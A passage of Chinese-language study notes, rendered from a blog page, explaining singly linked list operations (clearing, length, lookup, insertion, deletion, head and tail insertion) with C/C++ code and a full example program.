class="hljs-function">Status <span class="hljs-title">DestoryList</span><span class="hljs-params">(LinkList &amp;L)</span></span>&#123;  <span class="hljs-comment">//销毁单链表L</span><br>    LNode *p;   <span class="hljs-comment">//或者LinkList p</span><br>    <span class="hljs-keyword">while</span>(L)&#123;<br>        p = L;  <span class="hljs-comment">//从头结点开始</span><br>        L = L -&gt; next;  <span class="hljs-comment">//让一个指针指向下一个结点，L -&gt; next的值就是下一个结点的地址</span><br>        <span class="hljs-keyword">delete</span> p; <br>        <span class="hljs-comment">//c++：L = new LNode，delete p</span><br>        <span class="hljs-comment">//c：L = (LinkList)malloc(sizeof(LNode))，free(p)</span><br>     <br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>[补充算法3]</strong></p><p>清空链表：链表仍然存在，但链表中无元素，成为空链表（头结点和头指针仍然存在）</p><p>[算法思路]</p><p>依次释放所有结点，并将头结点指针域设置为空</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Status <span class="hljs-title">ClearList</span><span class="hljs-params">(LinkList &amp;L)</span></span>&#123;  <span class="hljs-comment">//将L重置为空表</span><br>    LNode *p,*q;   <span class="hljs-comment">//或者LinkList p,q;</span><br>    p = L -&gt;next;  <span class="hljs-comment">//p指向第一个结点</span><br>    <span class="hljs-keyword">while</span>(p)&#123;<br>        q = p -&gt; next;<br>        <span class="hljs-keyword">delete</span> p;<br>        p = q;<br>        <br>    &#125;<br>    L -&gt; next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>[补充算法4]</strong></p><p>求单链表的表长</p><p>[算法思路]</p><p>从 首元结点开始，依次计数所有结点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">ListLength</span><span class="hljs-params">(LinkList L)</span></span>&#123;   <span class="hljs-comment">//返回L中数据元素的个数</span><br>    <span class="hljs-comment">//会对表的内容改变用&amp;L，不改变就用L</span><br>    Lnode *p;   <span class="hljs-comment">//或者LinkList p</span><br>    p = L -&gt; next;  <span class="hljs-comment">//p指向第一个结点</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">while</span>(p)&#123;<br>        i ++;<br>        p = p -&gt; next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>总结：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//类型定义</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;  <span class="hljs-comment">//声明结点的类型和指向结点的指针类型</span><br>    ElemType data;          <span class="hljs-comment">// 结点的数据域       </span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *next;     <span class="hljs-comment">// 结点的指针域,这里用自己来定义自己</span><br>&#125;LNode,*LinkList;   <br><br><span class="hljs-comment">//变量定义</span><br>LinkList L;<br>LNode *p,*s;<br><br><span class="hljs-comment">//重要操作</span><br>p = L;  <span class="hljs-comment">//p指向头结点 </span><br>s = L-&gt;next;  <span class="hljs-comment">//s指向首元结点</span><br>p = p-&gt;next;  <span class="hljs-comment">//p指向下一结点</span><br></code></pre></td></tr></table></figure><h3 id="获取单链表某一位置上的元素">2.7.3获取单链表某一位置上的元素</h3><p>【算法步骤】</p><ol type="1"><li>从第1个结点 (L-&gt;next)顺链扫描，用指针p指向当前扫描到的结点，p初值p = L-&gt;next。</li><li>j 做计数器，累计当前扫描过的结点数，j 初值为1</li><li>当 p 指向扫描到的下一结点时，计数器 j 加1</li><li>当 j==i 时，p所指的结点就是要找的第 i 个结点</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//初始条件：L已存在</span><br><span class="hljs-comment">//操作结果：用e返回L中第i个数据元素的值</span><br><span class="hljs-function">Status <span class="hljs-title">GetElem</span><span class="hljs-params">(LinkList L,<span class="hljs-type">int</span> i,ElemType &amp;e)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    LNode *p;<br>    p = L-&gt;next;  <span class="hljs-comment">//让p指向链表L的第一个结点</span><br>    j = <span class="hljs-number">1</span>;   <span class="hljs-comment">//j为计数器</span><br>    <span class="hljs-keyword">while</span>(p &amp;&amp; j&lt;i)&#123;    <span class="hljs-comment">//向后扫描，直到p指向第i个元素或p为空</span><br>        p = p-&gt;next;<br>        ++j;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!p || j&gt;i) <span class="hljs-keyword">return</span> ERROR;   <span class="hljs-comment">//第i个元素不存在</span><br>    e = p -&gt; data;  <span class="hljs-comment">//第i个元素的数据</span><br>    <span class="hljs-keyword">return</span> OK;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单链表的按值查找">2.7.4 单链表的按值查找</h3><p>根据直到数据获取该数据所在的位置（地址）</p><p>【算法步骤】</p><ol type="1"><li>从第1个节点依次与e比较</li><li>如果找到一个与e值相等的数据，则返回在列表中的地址或位置</li><li>如果查遍整个链表都没有找到和e相等的元素，返回0/NULL</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Lnode *<span class="hljs-title">LocateELem_L</span> <span class="hljs-params">(LinkList L, Elemtype e)</span></span>&#123;<br>    <span class="hljs-comment">//在线性表L中查找值为e的数据元素</span><br>    <span class="hljs-comment">//找到，则返回L中值为e的数据元素的地址，查找失败返回NULL</span><br>    p=L-&gt;next;<br>    <span class="hljs-keyword">while</span>(p &amp;&amp; p-&gt;data!=e)<br>        p=p-&gt;next;<br><span class="hljs-keyword">return</span> p;<br>&#125;<br><span class="hljs-comment">//代码不是很完整</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//在线性表L中查找值为e的数据元素的位置序号</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LocateElem</span><span class="hljs-params">(LinkList L, Elemtype e)</span></span>&#123;<br>    LinkList p = L-&gt;next;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (p &amp;&amp; p-&gt;data != e) &#123;<br>p = p-&gt;next;<br>        j++;<br>&#125;<br><span class="hljs-keyword">if</span> (p) <span class="hljs-keyword">return</span> j; <br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单链表的插入">2.7.5 单链表的插入</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311221629330.png"alt="单链表的插入步骤" /><figcaption aria-hidden="true">单链表的插入步骤</figcaption></figure><blockquote><p>互换后：我指向我自己，ai的地址会丢失</p><p>想互换，可以多加一个指针</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//初试条件：L存在</span><br><span class="hljs-comment">//操作结果：在L中第i个位置之前插入新的数据元素e，L的长度加1</span><br><span class="hljs-function">Status <span class="hljs-title">ListInsert</span><span class="hljs-params">(LinkList &amp;L,<span class="hljs-type">int</span> i,ElemType e)</span></span>&#123;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>    LNode *p,*s;<br>    p=L;<br>    <span class="hljs-keyword">while</span> (p &amp;&amp; j&lt; i<span class="hljs-number">-1</span>)&#123;  <span class="hljs-comment">//寻找第i-1个结点</span><br>        p = p -&gt; next;<br>        j++;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!p || j &gt; i<span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> ERROR;<br>    s = <span class="hljs-keyword">new</span> LNode;<br>    s -&gt; data = e;<br>    s-&gt;next = p-&gt;next;<br>    p-&gt;next=s;<br>    <span class="hljs-keyword">return</span> OK;<br>        <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单链表的删除">2.7.6 单链表的删除</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311230918793.png"alt="删除第i个结点" /><figcaption aria-hidden="true">删除第i个结点</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//初始条件：L存在</span><br><span class="hljs-comment">//操作结果：删除L的第i个数据元素，并用e返回其值，L的长度减1</span><br><span class="hljs-function">Status <span class="hljs-title">ListDelete</span><span class="hljs-params">(LinkList &amp;L, <span class="hljs-type">int</span> i, ElemType &amp;e)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    LNode *p,*q;<br>    p = L;<br>    j = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">whlie</span>(p-&gt;next &amp;&amp; j&lt;i<span class="hljs-number">-1</span>)&#123; <span class="hljs-comment">//遍历寻找第i-1个元素</span><br>        p = p-&gt;next;<br>        ++j;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(p-&gt;next) || j&gt;i<span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> ERROR; <span class="hljs-comment">//第i个元素不存在</span><br>    q = p-&gt;next;   <span class="hljs-comment">//临时保存被删结点的地址以备释放</span><br>    p-&gt;next = q-&gt;next; <span class="hljs-comment">//q的后继赋值给p的后继</span><br>    e = q-&gt;data;  <span class="hljs-comment">//将q结点中的数据给e</span><br>    <span class="hljs-keyword">delete</span> q;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单链表的建立">2.7.7 单链表的建立</h3><h4 id="头插法前插法">头插法（前插法）</h4><p>——元素插入在链表头部</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311230958117.png"alt="头插法" /><figcaption aria-hidden="true">头插法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301745948.png"alt="头插法建立单链表" /><figcaption aria-hidden="true">头插法建立单链表</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//头插法创建单链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateList_L</span><span class="hljs-params">(LinkList  &amp;L, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    L = <span class="hljs-keyword">new</span> LNode;<br>    L -&gt; next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//先建立一个带头结点的单链表</span><br>    <span class="hljs-keyword">for</span>(i = n; i&gt;<span class="hljs-number">0</span>; --i)&#123;<br>        p = <span class="hljs-keyword">new</span> LNode;<span class="hljs-comment">//生成新结点，c语言是：p = (LNode*)malloc(sizeof(LNode))</span><br>        <span class="hljs-built_in">scanf</span>(&amp;p-&gt;data);<span class="hljs-comment">// c++是 cin&gt;&gt;p-&gt;data;</span><br>        p-&gt;next = L-&gt;next; <span class="hljs-comment">//插入到表头</span><br>        L-&gt;next = p;<br>    &#125;<br>&#125;<br>    <br></code></pre></td></tr></table></figure><h4 id="尾插法后插法">尾插法（后插法）</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311301803598.png"alt="尾插法建立单链表" /><figcaption aria-hidden="true">尾插法建立单链表</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//正位序输入n个元素的值，尾插法创建单链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateList_R</span><span class="hljs-params">(LinkList  &amp;L, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    L = <span class="hljs-keyword">new</span> LNode;<br>    L -&gt; next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//先建立一个带头结点的单链表</span><br>    LNode *r;<br>    r = L;  <span class="hljs-comment">//尾指针r指向头结点</span><br>    <span class="hljs-keyword">for</span>(i = n; i&gt;<span class="hljs-number">0</span>; --i)&#123;<br>        p = <span class="hljs-keyword">new</span> LNode;<span class="hljs-comment">//生成新结点，c语言是：p = (LNode*)malloc(sizeof(LNode))</span><br>        <span class="hljs-built_in">scanf</span>(&amp;p-&gt;data);<span class="hljs-comment">// c++是 cin&gt;&gt;p-&gt;data;</span><br>        p -&gt; next = <span class="hljs-literal">NULL</span>;<br>        r -&gt; next = p; <span class="hljs-comment">//插入到表尾</span><br>        r = p; <span class="hljs-comment">//r指向新的尾结点</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单链表小结">⭐单链表小结</h3><p>下面是在Vscode上写的代码，实现了上面所述的单链表的所有功能</p><p>注意销毁单链表的操作，笨🐭这里把它注释掉了，不然还要改，想测试的话可以ctrl+ /</p><p>还要注意在讨论链表的状态时，"链表为空" 和 "链表不存在"是两种不同的情况：</p><ol type="1"><li><strong>链表为空（Linked List is Empty）：</strong>这指的是链表被创建了，但没有添加任何元素，或者之前的元素都被删除了。在这种情况下，链表的头结点存在，但头结点的<code>next</code> 指针为空，没有其他有效的结点。</li><li><strong>链表不存在（Linked List does not exist）：</strong>这指的是链表根本没有被创建。在这种情况下，头结点都没有被分配内存，链表没有被初始化。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRUE 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FALSE 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Status;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;   <span class="hljs-comment">//ElemType的类型根据实际情况而定，这里假定为int</span><br><br><br><span class="hljs-comment">/*线性表的单链表存储结构*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;  <span class="hljs-comment">//声明结点的类型和指向结点的指针类型</span><br>    ElemType data;          <span class="hljs-comment">// 结点的数据域       </span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *next;     <span class="hljs-comment">// 结点的指针域,这里用自己来定义自己</span><br>&#125;LNode,*LinkList;    <br><br><br><br><span class="hljs-comment">// 输出链表中各个结点的元素，区分链表为空和链表不存在</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OutPut</span><span class="hljs-params">(LNode* p)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表不存在（已被销毁\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表为空\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    p = p-&gt;next;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-function">Status <span class="hljs-title">InitList</span><span class="hljs-params">(LinkList &amp;L)</span></span>&#123;<br>    L = <span class="hljs-keyword">new</span> LNode; <span class="hljs-comment">//或者用c语法：L = (LinkList)malloc(sizeof(LNode));(LinkList)是强制类型转换</span><br>    L -&gt; next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//头结点的指针域置空，指针域就是这个指针所指的结点的next域</span><br>    <span class="hljs-comment">//指针变量怎么操作它所指的结点的next的域呢，指针变量要操作某个成员，用-&gt;</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//头插法创建单链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateList_L</span><span class="hljs-params">(LinkList  &amp;L, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    L = <span class="hljs-keyword">new</span> LNode;<br>    L -&gt; next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//先建立一个带头结点的单链表</span><br>    LNode *p;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = n; i&gt;<span class="hljs-number">0</span>; --i)&#123;<br>        p = <span class="hljs-keyword">new</span> LNode;   <span class="hljs-comment">//生成新结点，c语言是：p = (LNode*)malloc(sizeof(LNode))</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;p-&gt;data); <span class="hljs-comment">// c++是 cin&gt;&gt;p-&gt;data;</span><br>        p-&gt;next = L-&gt;next; <span class="hljs-comment">//插入到表头</span><br>        L-&gt;next = p;<br>    &#125;<br>&#125; <br><br><span class="hljs-comment">//尾插法创建单链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateList_R</span><span class="hljs-params">(LinkList  &amp;L, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    L = <span class="hljs-keyword">new</span> LNode;<br>    L -&gt; next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//先建立一个带头结点的单链表</span><br>    LNode *r,*p;<br>    r = L;  <span class="hljs-comment">//尾指针r指向头结点</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = n; i&gt;<span class="hljs-number">0</span>; --i)&#123;<br>        p = <span class="hljs-keyword">new</span> LNode;<span class="hljs-comment">//生成新结点，c语言是：p = (LNode*)malloc(sizeof(LNode))</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;p-&gt;data);<span class="hljs-comment">// c++是 cin&gt;&gt;p-&gt;data;</span><br>        p -&gt; next = <span class="hljs-literal">NULL</span>;<br>        r -&gt; next = p; <span class="hljs-comment">//插入到表尾</span><br>        r = p; <span class="hljs-comment">//r指向新的尾结点</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 尾插法，在已经插入的基础上进行</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateList_R2</span><span class="hljs-params">(LinkList  &amp;L, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    LNode *r = L;  <span class="hljs-comment">// 尾指针r指向头结点</span><br><br>    <span class="hljs-comment">// 找到链表的尾节点</span><br>    <span class="hljs-keyword">while</span> (r-&gt;next) &#123;<br>        r = r-&gt;next;<br>    &#125;<br><br>    LNode *p;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        p = <span class="hljs-keyword">new</span> LNode;  <span class="hljs-comment">// 生成新结点</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;p-&gt;data);  <span class="hljs-comment">// 读取数据</span><br>        p-&gt;next = <span class="hljs-literal">NULL</span>;<br>        r-&gt;next = p;  <span class="hljs-comment">// 插入到尾部</span><br>        r = p;  <span class="hljs-comment">// r指向新的尾结点</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//判断是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">(LinkList L)</span></span>&#123;  <span class="hljs-comment">//若L为空表返回1，非空返回0</span><br>    <span class="hljs-keyword">if</span>(L-&gt;next)   <span class="hljs-comment">//非空</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-comment">//销毁单链表</span><br><span 